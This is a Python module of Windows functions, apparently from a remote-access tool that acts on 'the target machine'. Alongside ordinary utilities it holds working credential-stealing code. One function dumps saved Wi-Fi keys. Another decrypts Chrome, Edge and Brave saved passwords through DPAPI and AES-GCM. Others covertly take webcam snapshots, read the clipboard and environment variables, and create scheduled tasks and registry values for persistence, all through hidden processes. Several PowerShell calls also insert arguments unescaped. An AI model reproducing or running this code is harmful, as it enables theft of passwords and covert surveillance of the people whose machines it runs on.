import os
import ctypes
import ctypes.wintypes
import subprocess
import threading


def send_notification(title, message):
    try:
        ps = (
            'Add-Type -AssemblyName System.Windows.Forms;'
            '$n = New-Object System.Windows.Forms.NotifyIcon;'
            '$n.Icon = [System.Drawing.SystemIcons]::Information;'
            '$n.Visible = $true;'
            f'$n.ShowBalloonTip(5000, "{title}", "{message}", "Info");'
            'Start-Sleep 6; $n.Dispose()'
        )
        subprocess.Popen(
            ['powershell', '-Command', ps],
            creationflags=0x08000000,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def get_wallpaper():
    try:
        buf = ctypes.create_unicode_buffer(512)
        ctypes.windll.user32.SystemParametersInfoW(0x0073, 512, buf, 0)
        return {"path": buf.value, "error": None}
    except Exception as e:
        return {"path": "", "error": str(e)}


def set_wallpaper(path):
    try:
        path = os.path.abspath(path)
        if not os.path.exists(path):
            return {"ok": False, "error": "File not found"}
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, path, 3)
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def list_installed_programs():
    try:
        import winreg
    except ImportError:
        return []
    programs = []
    paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    ]
    seen = set()
    for hive, path in paths:
        try:
            key = winreg.OpenKey(hive, path)
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    except FileNotFoundError:
                        continue
                    if name in seen:
                        continue
                    seen.add(name)
                    version = ""
                    publisher = ""
                    size = 0
                    try:
                        version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                    except Exception:
                        pass
                    try:
                        publisher = winreg.QueryValueEx(subkey, "Publisher")[0]
                    except Exception:
                        pass
                    try:
                        size = winreg.QueryValueEx(subkey, "EstimatedSize")[0]
                    except Exception:
                        pass
                    programs.append({
                        "name": name,
                        "version": version,
                        "publisher": publisher,
                        "size_kb": size,
                    })
                    winreg.CloseKey(subkey)
                except Exception:
                    pass
            winreg.CloseKey(key)
        except Exception:
            pass
    programs.sort(key=lambda x: x["name"].lower())
    return programs


def list_network_connections():
    try:
        import psutil
        conns = []
        for c in psutil.net_connections(kind="inet"):
            try:
                proc_name = ""
                if c.pid:
                    try:
                        proc_name = psutil.Process(c.pid).name()
                    except Exception:
                        pass
                conns.append({
                    "proto": "TCP" if c.type == 1 else "UDP",
                    "local": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "",
                    "remote": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "",
                    "status": c.status if hasattr(c, "status") else "",
                    "pid": c.pid or 0,
                    "process": proc_name,
                })
            except Exception:
                pass
        return conns
    except Exception:
        return []


def list_startup_programs():
    try:
        import winreg
    except ImportError:
        return []
    items = []
    keys = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKCU"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKLM"),
    ]
    for hive, path, scope in keys:
        try:
            key = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
            count = winreg.QueryInfoKey(key)[1]
            for i in range(count):
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    items.append({"name": name, "command": value, "scope": scope})
                except Exception:
                    pass
            winreg.CloseKey(key)
        except Exception:
            pass
    return items


def remove_startup_program(name, scope="HKCU"):
    try:
        import winreg
        if scope == "HKLM":
            hive = winreg.HKEY_LOCAL_MACHINE
        else:
            hive = winreg.HKEY_CURRENT_USER
        key = winreg.OpenKey(
            hive, r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def volume_control(action):
    try:
        import pyautogui
        if action == "mute":
            pyautogui.press("volumemute")
        elif action == "up":
            for _ in range(5):
                pyautogui.press("volumeup")
        elif action == "down":
            for _ in range(5):
                pyautogui.press("volumedown")
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def list_monitors():
    try:
        import mss
        with mss.mss() as sct:
            monitors = []
            for i, m in enumerate(sct.monitors):
                monitors.append({
                    "index": i,
                    "left": m["left"],
                    "top": m["top"],
                    "width": m["width"],
                    "height": m["height"],
                    "label": "All Monitors" if i == 0 else f"Monitor {i}",
                })
            return monitors
    except Exception:
        return []


def power_action(action):
    """lock | sleep | shutdown | restart"""
    try:
        if action == "lock":
            ctypes.windll.user32.LockWorkStation()
        elif action == "sleep":
            subprocess.Popen(
                ["powershell", "-Command", "Add-Type -Assembly System.Windows.Forms; [System.Windows.Forms.Application]::SetSuspendState('Suspend', $false, $false)"],
                creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
        elif action == "shutdown":
            subprocess.Popen(["shutdown", "/s", "/t", "0"], creationflags=0x08000000)
        elif action == "restart":
            subprocess.Popen(["shutdown", "/r", "/t", "0"], creationflags=0x08000000)
        else:
            return {"ok": False, "error": f"unknown action: {action}"}
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def get_wifi_passwords():
    """Return list of {ssid, password} for all saved WiFi profiles."""
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            creationflags=0x08000000, stderr=subprocess.DEVNULL,
        ).decode(errors="replace")
        ssids = [line.split(":")[1].strip() for line in out.splitlines() if "All User Profile" in line]
        results = []
        for ssid in ssids:
            try:
                detail = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                    creationflags=0x08000000, stderr=subprocess.DEVNULL,
                ).decode(errors="replace")
                pwd = ""
                for line in detail.splitlines():
                    if "Key Content" in line:
                        pwd = line.split(":")[1].strip()
                        break
                results.append({"ssid": ssid, "password": pwd})
            except Exception:
                results.append({"ssid": ssid, "password": ""})
        return results
    except Exception as e:
        return []


def get_active_window():
    """Return the title of the currently focused window."""
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return {"title": buf.value, "hwnd": hwnd}
    except Exception as e:
        return {"title": "", "hwnd": 0, "error": str(e)}


def webcam_snapshot():
    """Capture a single JPEG frame from the default webcam. Returns raw bytes."""
    import cv2
    import io
    from PIL import Image
    cap = cv2.VideoCapture(0)
    try:
        ok, frame = cap.read()
        if not ok:
            raise RuntimeError("Could not read from webcam")
        rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        img = Image.fromarray(rgb)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=75)
        return buf.getvalue()
    finally:
        cap.release()


def list_drives():
    """List all logical drives with type and space info."""
    import shutil
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    type_map = {0:"unknown",1:"no_root",2:"removable",3:"fixed",4:"network",5:"cdrom",6:"ramdisk"}
    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        if bitmask & 1:
            path = f"{letter}:\\"
            dtype = ctypes.windll.kernel32.GetDriveTypeW(path)
            entry = {"letter": letter, "path": path, "type": type_map.get(dtype, "unknown")}
            try:
                total, used, free = shutil.disk_usage(path)
                entry.update({"total_gb": round(total/1e9,2), "used_gb": round(used/1e9,2), "free_gb": round(free/1e9,2)})
            except Exception:
                pass
            drives.append(entry)
        bitmask >>= 1
    return drives


def get_event_logs(log_name="Security", count=50):
    """Read recent Windows event log entries via PowerShell."""
    try:
        import json
        out = subprocess.check_output(
            ["powershell", "-Command",
             f"Get-EventLog -LogName '{log_name}' -Newest {count} | "
             "Select-Object EventID,EntryType,Source,TimeGenerated,Message | ConvertTo-Json"],
            creationflags=0x08000000, stderr=subprocess.DEVNULL, timeout=30,
        ).decode(errors="replace")
        data = json.loads(out) if out.strip() else []
        return data if isinstance(data, list) else [data]
    except Exception as e:
        return []


def registry_get(hive_str, path, name=""):
    """Read a registry key or value."""
    try:
        import winreg
        hmap = {"HKCU": winreg.HKEY_CURRENT_USER, "HKLM": winreg.HKEY_LOCAL_MACHINE,
                "HKCR": winreg.HKEY_CLASSES_ROOT, "HKU": winreg.HKEY_USERS}
        hive = hmap.get(hive_str.upper(), winreg.HKEY_CURRENT_USER)
        key  = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
        if name:
            val, vtype = winreg.QueryValueEx(key, name)
            winreg.CloseKey(key)
            return {"value": str(val), "type": vtype}
        subkeys, values = [], []
        i = 0
        while True:
            try: subkeys.append(winreg.EnumKey(key, i)); i += 1
            except OSError: break
        i = 0
        while True:
            try:
                n, v, t = winreg.EnumValue(key, i)
                values.append({"name": n, "value": str(v)[:300], "type": t}); i += 1
            except OSError:
                break
        winreg.CloseKey(key)
        return {"subkeys": subkeys, "values": values}
    except Exception as e:
        return {"error": str(e)}


def registry_set(hive_str, path, name, value, reg_type="REG_SZ"):
    """Write a registry value."""
    try:
        import winreg
        hmap = {"HKCU": winreg.HKEY_CURRENT_USER, "HKLM": winreg.HKEY_LOCAL_MACHINE,
                "HKCR": winreg.HKEY_CLASSES_ROOT}
        tmap = {"REG_SZ": winreg.REG_SZ, "REG_DWORD": winreg.REG_DWORD,
                "REG_QWORD": winreg.REG_QWORD, "REG_EXPAND_SZ": winreg.REG_EXPAND_SZ,
                "REG_MULTI_SZ": winreg.REG_MULTI_SZ, "REG_BINARY": winreg.REG_BINARY}
        hive = hmap.get(hive_str.upper(), winreg.HKEY_CURRENT_USER)
        key  = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, tmap.get(reg_type.upper(), winreg.REG_SZ), value)
        winreg.CloseKey(key)
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def get_env_vars():
    """Return all environment variables."""
    return dict(os.environ)


def list_user_accounts():
    """List local Windows user accounts."""
    try:
        import json
        out = subprocess.check_output(
            ["powershell", "-Command",
             "Get-LocalUser | Select-Object Name,Enabled,LastLogon,Description | ConvertTo-Json"],
            creationflags=0x08000000, stderr=subprocess.DEVNULL, timeout=15,
        ).decode(errors="replace")
        data = json.loads(out) if out.strip() else []
        return data if isinstance(data, list) else [data]
    except Exception:
        return []


def list_scheduled_tasks():
    """List Windows scheduled tasks."""
    try:
        import json
        out = subprocess.check_output(
            ["powershell", "-Command",
             "Get-ScheduledTask | Select-Object TaskName,TaskPath,State | ConvertTo-Json"],
            creationflags=0x08000000, stderr=subprocess.DEVNULL, timeout=20,
        ).decode(errors="replace")
        data = json.loads(out) if out.strip() else []
        return data if isinstance(data, list) else [data]
    except Exception:
        return []


def create_scheduled_task(name, command, trigger_time=""):
    """Create a one-time or repeating scheduled task."""
    try:
        if trigger_time:
            ps = (f'$action = New-ScheduledTaskAction -Execute "{command}"; '
                  f'$trigger = New-ScheduledTaskTrigger -Once -At "{trigger_time}"; '
                  f'Register-ScheduledTask -TaskName "{name}" -Action $action -Trigger $trigger -Force')
        else:
            ps = (f'$action = New-ScheduledTaskAction -Execute "{command}"; '
                  f'Register-ScheduledTask -TaskName "{name}" -Action $action -Force')
        subprocess.check_output(
            ["powershell", "-Command", ps],
            creationflags=0x08000000, stderr=subprocess.DEVNULL, timeout=15,
        )
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def delete_scheduled_task(name):
    """Delete a scheduled task by name."""
    try:
        subprocess.check_output(
            ["powershell", "-Command", f'Unregister-ScheduledTask -TaskName "{name}" -Confirm:$false'],
            creationflags=0x08000000, stderr=subprocess.DEVNULL, timeout=15,
        )
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def play_audio(path):
    """Play an audio file on the target machine."""
    try:
        if path.lower().endswith(".wav"):
            subprocess.Popen(
                ["powershell", "-Command", f'(New-Object Media.SoundPlayer "{path}").PlaySync()'],
                creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
        else:
            subprocess.Popen(
                ["powershell", "-Command",
                 f'Add-Type -AssemblyName presentationCore; '
                 f'$p = New-Object System.Windows.Media.MediaPlayer; '
                 f'$p.Open("{path}"); $p.Play(); Start-Sleep 60'],
                creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def get_clipboard_history():
    """Return current clipboard text content."""
    try:
        out = subprocess.check_output(
            ["powershell", "-Command", "Get-Clipboard -Format Text -Raw"],
            creationflags=0x08000000, stderr=subprocess.DEVNULL, timeout=5,
        ).decode(errors="replace").strip()
        return {"current": out}
    except Exception as e:
        return {"current": "", "error": str(e)}


def get_dns_cache():
    """Read the local DNS resolver cache."""
    try:
        out = subprocess.check_output(
            ["ipconfig", "/displaydns"],
            creationflags=0x08000000, stderr=subprocess.DEVNULL, timeout=10,
        ).decode(errors="replace")
        import re
        names = list(dict.fromkeys(
            m.strip() for m in re.findall(r"Record Name\s*\.\s*:\s*(.+)", out)
        ))
        return names
    except Exception:
        return []


def lan_scan():
    """Return ARP table entries (IP + MAC of LAN devices)."""
    try:
        out = subprocess.check_output(
            ["arp", "-a"],
            creationflags=0x08000000, stderr=subprocess.DEVNULL, timeout=10,
        ).decode(errors="replace")
        import re
        entries = []
        for line in out.splitlines():
            m = re.match(r'\s*(\d+\.\d+\.\d+\.\d+)\s+([\w-]{11,17})\s+(\w+)', line)
            if m:
                entries.append({"ip": m.group(1), "mac": m.group(2), "type": m.group(3)})
        return entries
    except Exception:
        return []


def get_browser_passwords():
    """Extract saved passwords from Chrome, Edge, and Brave."""
    import json as _json, sqlite3 as _sq, base64 as _b64, shutil as _sh, tempfile as _tmp
    results = []

    def _aes_decrypt(enc, key):
        try:
            from Cryptodome.Cipher import AES
        except ImportError:
            try:
                from Crypto.Cipher import AES
            except ImportError:
                return "(pycryptodome not installed)"
        if enc[:3] in (b"v10", b"v11"):
            iv, payload, tag = enc[3:15], enc[15:-16], enc[-16:]
            try:
                return AES.new(key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(payload, tag).decode(errors="replace")
            except Exception:
                return ""
        return ""

    def _dpapi_decrypt(data):
        class _BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_uint), ("pbData", ctypes.POINTER(ctypes.c_byte))]
        raw = (ctypes.c_byte * len(data))(*data)
        b_in = _BLOB(len(data), raw)
        b_out = _BLOB()
        ok = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(b_in), None, None, None, None, 0, ctypes.byref(b_out))
        if ok:
            result = bytes(ctypes.string_at(b_out.pbData, b_out.cbData))
            ctypes.windll.kernel32.LocalFree(b_out.pbData)
            return result
        return b""

    browsers = {
        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA",""), "Google","Chrome","User Data"),
        "Edge":   os.path.join(os.environ.get("LOCALAPPDATA",""), "Microsoft","Edge","User Data"),
        "Brave":  os.path.join(os.environ.get("LOCALAPPDATA",""), "BraveSoftware","Brave-Browser","User Data"),
    }

    for browser, base_path in browsers.items():
        if not os.path.isdir(base_path):
            continue
        aes_key = None
        try:
            with open(os.path.join(base_path, "Local State"), "r", encoding="utf-8") as f:
                enc_key = _b64.b64decode(_json.load(f)["os_crypt"]["encrypted_key"])[5:]
            aes_key = _dpapi_decrypt(enc_key)
        except Exception:
            pass
        for profile_dir in os.listdir(base_path):
            db_src = os.path.join(base_path, profile_dir, "Login Data")
            if not os.path.isfile(db_src):
                continue
            tmp_db = os.path.join(_tmp.gettempdir(), f"nora_{browser}_{profile_dir}.db")
            try:
                _sh.copy2(db_src, tmp_db)
                conn = _sq.connect(tmp_db)
                for url, user, enc_pwd in conn.execute("SELECT origin_url,username_value,password_value FROM logins"):
                    pwd = ""
                    if enc_pwd:
                        pwd = _aes_decrypt(enc_pwd, aes_key) if aes_key else "(encrypted)"
                    if user or pwd:
                        results.append({"browser": browser, "profile": profile_dir,
                                         "url": url, "username": user, "password": pwd})
                conn.close()
            except Exception:
                pass
            finally:
                try: os.unlink(tmp_db)
                except Exception: pass
    return results
